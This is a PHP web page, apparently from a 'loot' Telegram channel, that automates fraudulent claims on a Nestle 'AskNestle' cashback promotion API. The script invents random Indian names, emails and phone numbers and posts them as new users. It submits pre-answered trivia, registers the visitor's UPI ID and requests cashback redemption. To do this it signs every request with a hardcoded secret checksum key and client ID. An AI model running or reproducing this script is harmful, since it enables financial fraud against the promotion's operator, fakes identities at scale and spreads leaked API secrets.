<script>if(top!=self){ top.location.replace(document.location); alert("No sir! Aap isko copy nhi kr skte.Join @loot_1970")}</script>
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rahul</title>
    <style>
        input[type=text], [type=number], select {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type=submit] {
            width: 60%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type=submit]:hover {
            background-color: #45a049;
        }
        div {
            border-radius: 5px;
            background-color: #f2f2f2;
            padding: 20px;
        }
    </style>
    
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body style="background-color: White;">
    <center><b><font color="black" size="3"><hr>free <center><hr>
    	
 
 
<?php



if (!isset($_POST['submit'])) {
    echo "<form method='POST' action=''>
        <input type='text' name='upi' class='input' placeholder='Enter Your UPI' required />
        <input type='submit' value='Transfer' name='submit' class='submit'>
    </form>";
    
   
 
    
} elseif (isset($_POST['submit'])) {
    $upi = $_POST['upi'];
$f = array("Vasu","Nirmal","Akshay","Chander","Rupinder","Akhil","Shanti","Ravi","Kunal","Chandrakant","Sulabha","Mahinder","Swapnil","Deepa","Sulabha","Neelima","Vijaya","Nikhil","Isha","Siddhi","Ajeet","Kshitija","Anila","Jitender","Sumeet","Preethi","Priti","Gayathri","Dhaval","Mukesh","Lalita","Rachana","Rakhi","Harshal","Shekhar","Rajiv","Balakrishna","Ajeet","Tara","Chander","Deepa","Prabhu","Rajendra","Jeetendra","Nandu","Aniket","Sumati","Prabhu","Vimal","Indira","Laxman","Agni","Kapil","Kailash","Puneet","Pratik","Pankaj","Ishore","Swati","Rupa","Hardeep","Prabhu","Khushi","Gurmeet","Nishant","Rishi","Naveen");
$fname = $f[mt_rand(0,60)];
$email = $fname . mt_rand(1000,9000) . "@gmail.com";

function generateIndianMobileNumber() {
    $prefixes = [6, 7, 8, 9]; 
    $firstDigit = $prefixes[array_rand($prefixes)];
    $remainingDigits = mt_rand(100000000, 999999999); 

    return $firstDigit . $remainingDigits;
}


$num = generateIndianMobileNumber();


function sha256($data) {
    return hash('sha256', $data);
}

function sortJsonBody($json) {
    try {
        if (!$json || trim($json) === "") {
            return "";
        }
        
        $decoded = json_decode($json, true);
        
        if (!is_array($decoded)) {
            throw new Exception("Invalid JSON format");
        }
        
        krsort($decoded); 
        return json_encode($decoded, JSON_UNESCAPED_SLASHES);
    } catch (Exception $e) {
        error_log("Error parsing or sorting the JSON body: " . $e->getMessage());
        return "";
    }
}

function generateChecksum($data, $secretKey) {
    $secretHash = sha256($secretKey);
    $sortedBody = sortJsonBody($data);

    $checksumInput = ($sortedBody !== "" && $sortedBody !== "{}") ? $secretHash . $sortedBody : $secretHash;
    return sha256($checksumInput);
}

function httpCall($url, $method = "POST", $jsonBody = null, $headers = []) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, strtoupper($method));

    if ($jsonBody) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonBody);
        $headers[] = "Content-Length: " . strlen($jsonBody);
    }

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    $response = curl_exec($ch);
    curl_close($ch);

    return $response; 
}


$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-user-detail";


$data = '{"msisdn":"'.$num.'","firstName":"'.$fname.'","lastName":"","emailId":"'.$email.'","howOldIsYourKid":"Between 2-6 Years Old","state":"Delhi","consent1":true,"consent2":true,"isLoginAllowed":false,"ssoId":"NA"}';


$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");


$headers = [
    "Content-Type: application/json",
    "Accept: application/json",
    "checksum: $checksum",
    "msisdn: $num",
    "campaignId: 1",
    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
    "appVersion: 1.0",
    "appName: asknestle",
    "channel: WEB",
    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
];






$response = httpCall($url, "POST", $data, $headers);

//echo"$response ";


$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-answers";


$data = '{"msisdn":"'.$num.'","answersMap":{"trivia1":{"answer":"Carbohydrate","question":"Which nutrient is the major source of energy for the body?","isCorrect":true},"trivia2":{"answer":"It has nutrients for good gut health","question":"This is a benefit of eating curd?","isCorrect":true},"trivia3":{"answer":"2000 kcal","question":"What is the average energy requirement for an adult per day?","isCorrect":true},"trivia4":{"answer":"Milk & milk products","question":"Fiber rich food does not include?","isCorrect":true},"trivia5":{"answer":"Guava","question":"Which among these is NOT a good source of vitamin A?","isCorrect":true}}}';



$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");


$headers = [
    "Content-Type: application/json",
    "Accept: application/json",
    "checksum: $checksum",
    "msisdn: $num",
    "campaignId: 1",
    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
    "appVersion: 1.0",
    "appName: asknestle",
    "channel: WEB",
    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
];


$response = httpCall($url, "POST", $data, $headers);

//echo"$response";


$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-upi-info";


$data = '{"vpa":"'.$upi.'"}';


$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");


$headers = [
    "Content-Type: application/json",
    "Accept: application/json",
    "checksum: $checksum",
    "msisdn: $num",
    "campaignId: 1",
    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
    "appVersion: 1.0",
    "appName: asknestle",
    "channel: WEB",
    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
];



$response = httpCall($url, "POST", $data, $headers);
$json = json_decode($response, true);
$msg=$json["msg"];
if($json['status']==='SUCCESS'){
 

$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/redemption";



$data = '{"redemptionType":"CASHBACK"}';

$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");


$headers = [
    "Content-Type: application/json",
    "Accept: application/json",
    "checksum: $checksum",
    "msisdn: $num",
    "campaignId: 1",
    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
    "appVersion: 1.0",
    "appName: asknestle",
    "channel: WEB",
    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
];



$response = httpCall($url, "POST", $data, $headers);

$json = json_decode($response, true);
$msg=$json["msg"];
if ($json['status'] === 'SUCCESS') {
   
echo "$msg";
echo"$response";



echo"<meta http-equiv='refresh' content=669;url=tg://resolve?domain=loot_1970>";
        
        
} else {
    
    echo "$msg"; 
    echo"<meta http-equiv='refresh' content=699;url=tg://resolve?domain=loot_1970>";


}
} else {
    
 echo "$msg"; 
 echo"<meta http-equiv='refresh' content=789;url=tg://resolve?domain=loot_1970>";}}
 
 
?>
